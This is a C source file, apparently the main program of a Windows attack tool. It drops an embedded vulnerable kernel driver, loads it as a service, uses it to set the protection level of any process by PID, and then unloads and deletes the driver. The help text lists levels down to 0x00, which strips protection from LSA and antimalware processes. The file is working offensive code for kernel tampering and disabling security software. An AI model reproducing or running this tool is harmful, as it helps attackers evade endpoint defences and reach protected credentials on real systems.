#include "common.h"

#include "vdriver.h"

// Print help message
void printHelp(char* fileName) {
	printf("Usage: %s -p <PID> -v <NEW PROTECTION LEVEL>\n", fileName);
	printf("Options:\n");
	printf("  -p <pid>              Specify the process ID (PID) of the process to change the protection level.\n");
	printf("  -v <protection_level> Specify the protection level value in hexadecimal (e.g., 0x00 for NO_PROTECTION).\n");
	printf("  -h                    Display this help message.\n");
	printf("\nPossible protection level values:\n");
	printf("  0x72  PS_PROTECTED_SYSTEM               System protected process\n");
	printf("  0x62  PS_PROTECTED_WINTCB               Windows TCB protected process\n");
	printf("  0x52  PS_PROTECTED_WINDOWS              Windows protected process\n");
	printf("  0x12  PS_PROTECTED_AUTHENTICODE         Authenticode protected process\n");
	printf("  0x61  PS_PROTECTED_WINTCB_LIGHT         Windows TCB light protected process\n");
	printf("  0x51  PS_PROTECTED_WINDOWS_LIGHT        Windows light protected process\n");
	printf("  0x41  PS_PROTECTED_LSA_LIGHT            LSA light protected process\n");
	printf("  0x31  PS_PROTECTED_ANTIMALWARE_LIGHT    Antimalware light protected process\n");
	printf("  0x11  PS_PROTECTED_AUTHENTICODE_LIGHT   Authenticode light protected process\n");
	printf("  0x00  NO_PROTECTION for no protection\n");
}

int main(int argc, char** argv) {

	BOOL	bSTATE					= TRUE;
	DWORD64 dwPID					= 0;	// Stores the PID of the target proccess
	DWORD	dwProtectionLevel		= 0;	// Stores the choosen protection level
	LPWSTR	szVulnDriverPath		= NULL; // 

	// If not enough arguments are supplied print the help function
	if (argc < 5) {
		printHelp(argv[0]);
		return EXIT_FAILURE;
	}

	// Parse the arguments
	for (int i = 1; i < argc; ++i) {
		if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
			dwPID = strtoull(argv[++i], NULL, 10);
		}
		else if (strcmp(argv[i], "-v") == 0 && i + 1 < argc) {
			dwProtectionLevel = strtoul(argv[++i], NULL, 16);
		}
		else if (strcmp(argv[i], "-h") == 0) {
			printHelp(argv[0]);
			return EXIT_SUCCESS;
		}
	}

	// Check PID Value
	if (dwPID == 0) {
		printHelp(argv[0]);
		return EXIT_FAILURE;
	}

	// Get the offsets for UniqueProcessId, ActiveProcessLinks and Protection level
	info("GetOffsets - Getting offsets for UniqueProcessId, ActiveProcessLinks and Protection level")
	if (!GetOffsets()) {
		return EXIT_FAILURE;
	}
	PrintOffsets();
	okay("GetOffsets - Retrieved offsets");
	
	// Write the vulnerable driver to the file system
	info("WriteDriverToFile - Writing vulnerable driver to filesystem");
	if (!WriteDriverToFile(g_VULNDRIVERFILENAME, cVDriver, cVDriverLength, &szVulnDriverPath)) {
		error("Failed to write driver to filesystem");
		if (szVulnDriverPath) {
			free(szVulnDriverPath); // Free the allocated memory
		}
		return EXIT_FAILURE;
	}
	okayW(L"WriteDriverToFile - Written vulnerable driver to \"%s\"", szVulnDriverPath);
	printf("\n");
	
	// Load the vulnerable driver as a service
	infoW(L"LoadDriver - Loading vulnerable driver from \"%s\" with name \"%s\"", szVulnDriverPath, g_VULNDRIVERNAME);
	if (!LoadDriver(g_VULNDRIVERNAME, szVulnDriverPath)) {
		error("LoadDriver - Failed to load driver");
		BOOL bSTATE = FALSE;
		goto _cleanUp;
	}
	okayW("LoadDriver - Loaded vulnerable driver, servicename: \"%s\"", g_VULNDRIVERNAME);
	printf("\n");
	
	// Change protection level
	info("ChangeProtectionLevel - Changing protection level of PID %d to 0x%02X", dwPID, dwProtectionLevel);
	if (!ChangeProtectionLevel(dwPID, dwProtectionLevel)) {
		error("ChangeProtectionLevel - Failed to change protection level");
		BOOL bSTATE = FALSE;
		goto _cleanUp;
	}
	info("ChangeProtectionLevel - Protectection level of PID %d changed to 0x%02X", dwPID, dwProtectionLevel);
	printf("\n");
	
_cleanUp:

	// ** CLEANUP SECTION ** //
	
	// Unloading vulnerable driver
	infoW(L"UnloadDriver - Unloading vulnerable driver \"%s\"", g_VULNDRIVERNAME);
	if (!UnloadDriver(g_VULNDRIVERNAME)) {
		error("UnloadDriver - Failed to unload driver");
		BOOL bSTATE = FALSE;
	}
	okayW("UnloadDriver - Unloaded vulnerable driver \"%s\"", g_VULNDRIVERNAME);
	printf("\n");
	
	// Remove vulnerable driver from filesystem
	infoW(L"RemoveFileW - Vulnerable driver \"%s\"", szVulnDriverPath);
	if (!RemoveFileW(szVulnDriverPath)) {
		error("RemoveFileW - Failed to delete file");
		BOOL bSTATE = FALSE;
	}
	okayW("RemoveFileW - Deleted vulnerable driver \"%s\"", szVulnDriverPath);
	printf("\n");
	
	// Free allocated memory
	if (szVulnDriverPath != NULL) {
		free(szVulnDriverPath);
	}

	if (bSTATE) {
		return EXIT_SUCCESS;
	}
	else {
		return EXIT_FAILURE;
	}
	
}